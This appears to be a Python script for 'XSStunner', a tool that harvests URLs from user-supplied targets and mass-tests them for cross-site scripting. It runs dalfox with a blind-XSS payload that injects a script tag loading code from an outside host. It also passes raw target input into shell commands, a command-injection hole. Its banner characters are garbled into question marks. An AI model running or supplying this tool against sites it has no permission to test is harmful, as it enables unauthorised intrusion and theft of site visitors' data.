import subprocess
import os
import logging
from pathlib import Path
import threading

# ANSI color codes for text formatting
RED = '\033[1;31m'
GREEN = '\033[1;32m'
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
CYAN = '\033[1;36m'
WHITE = '\033[1;37m'
RESET = '\033[0m'

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')

# Function to display a banner
def banner():
    os.system("clear")
    print(f"{CYAN}?????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????")
    print(f"???    {WHITE}XSStunner {CYAN} - {GREEN}Automated XSS Scanning Tool         ???")
    print(f"???                                                     ???")
    print(f"???        {RED}Created by anonre {CYAN}| {RED}Ethical Hacking Only{CYAN}     ???")
    print(f"???                                                     ???")
    print(f"???   {YELLOW}?????????????????????????????????????????????????????????????????????????????????????????????????????????{RESET}               ???")
    print(f"???      {CYAN}Prepare for a journey into the unknown...      ???")
    print(f"?????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????")
    print(f"{RESET}")

# Function to print colored messages
def print_message(color, message):
    print(f"{color}{message}{RESET}")

# Check if required dependencies are installed
def check_dependencies():
    dependencies = ["gau", "gf", "uro", "Gxss", "kxss", "dalfox", "tee"]
    for cmd in dependencies:
        try:
            subprocess.run(f"command -v {cmd}", shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        except subprocess.CalledProcessError:
            logging.error(f"[!] Dependency {cmd} not found. Please install it first.")
            exit(1)

# Run gau and filter XSS-related results
def run_gau_and_filter(target, output_dir):
    try:
        print_message(BLUE, f"[*] Running XSS search for target: {target}")
        with open(f"{output_dir}/xss_output.txt", "w") as output_file:
            subprocess.run(
                f"echo {target} | gau | gf xss | uro | Gxss | kxss | tee {output_file.name}",
                shell=True, stdout=output_file, stderr=subprocess.PIPE, check=True
            )
    except Exception as e:
        logging.error(f"Error running gau and filter: {e}")
        exit(1)

# Process the results and filter unique URLs
def process_results(output_dir):
    try:
        print_message(YELLOW, "[*] Processing results and filtering URLs...")
        with open(f"{output_dir}/xss_output.txt", "r") as file:
            urls = set()
            for line in file:
                if line.startswith("URL: "):
                    url = line.split('URL: ')[1].split('=')[0] + '='
                    urls.add(url)
        with open(f"{output_dir}/final.txt", "w") as final_file:
            for url in sorted(urls):
                final_file.write(url + "\n")
    except Exception as e:
        logging.error(f"Error processing results: {e}")
        exit(1)

# Run Dalfox on the filtered URLs
def run_dalfox(output_dir):
    try:
        print_message(GREEN, "[*] Running Dalfox with XSSHunter payload...")
        subprocess.run(
            f"dalfox file {output_dir}/final.txt --custom-payload '\"><script src=\"https://js.rip/px592rfcv0\"></script>' --output {output_dir}/dalfox_results.txt", # change costum payload with yours
            shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )
    except Exception as e:
        logging.error(f"Error running Dalfox: {e}")
        exit(1)

# Process a single target
def process_single_target():
    target = input(f"{CYAN}Enter target: {RESET}")
    
    # Create directory for storing results
    output_dir = Path(f"results/{target}")
    output_dir.mkdir(parents=True, exist_ok=True)
    
    print_message(WHITE, f"[*] Creating results directory at: {output_dir}")

    # Run the main scanning process
    run_gau_and_filter(target, output_dir)

    # Process the results to filter URLs
    process_results(output_dir)

    # Run Dalfox to scan the final list of URLs
    run_dalfox(output_dir)

    # Final message after the process is done for this target
    print_message(GREEN, f"[???] Process completed for target {target}! Results saved in: {output_dir}")

# Function to process each target in a thread
def process_target_thread(target):
    output_dir = Path(f"results/{target}")
    output_dir.mkdir(parents=True, exist_ok=True)
    print_message(WHITE, f"[*] Creating results directory at: {output_dir}")

    # Run the main scanning process
    run_gau_and_filter(target, output_dir)

    # Process the results to filter URLs
    process_results(output_dir)

    # Run Dalfox to scan the final list of URLs
    run_dalfox(output_dir)

    # Final message after the process is done for this target
    print_message(GREEN, f"[???] Process completed for target {target}! Results saved in: {output_dir}")

# Process multiple targets with dynamic threading (3 threads at a time)
def process_multiple_targets():
    file_path = input(f"{CYAN}Enter the path of the file containing target list: {RESET}")
    
    # Check if the file exists
    if not Path(file_path).exists():
        logging.error(f"[!] File {file_path} not found.")
        exit(1)

    # Read targets from the file
    with open(file_path, "r") as file:
        targets = [line.strip() for line in file.readlines() if line.strip()]

    if not targets:
        logging.error("[!] File does not contain valid targets.")
        exit(1)

    # Create and start threads dynamically (3 threads at a time)
    thread_lock = threading.Semaphore(5)  # Limit the number of concurrent threads to 3
    threads = []

    def worker(target):
        with thread_lock:
            process_target_thread(target)

    # Start threads for each target
    for target in targets:
        thread = threading.Thread(target=worker, args=(target,))
        threads.append(thread)
        thread.start()

    # Wait for all threads to complete
    for t in threads:
        t.join()

# Main function
def main():
    banner()
    
    # Ask the user whether to process a single target or multiple targets
    choice = input(f"{CYAN}Choose an option:\n1. Single Target\n2. Multiple Targets\nEnter choice (1/2): {RESET}")
    
    if choice == "1":
        process_single_target()
    elif choice == "2":
        process_multiple_targets()
    else:
        logging.error("[!] Invalid choice. Exiting program.")
        exit(1)

if __name__ == "__main__":
    check_dependencies()
    main()
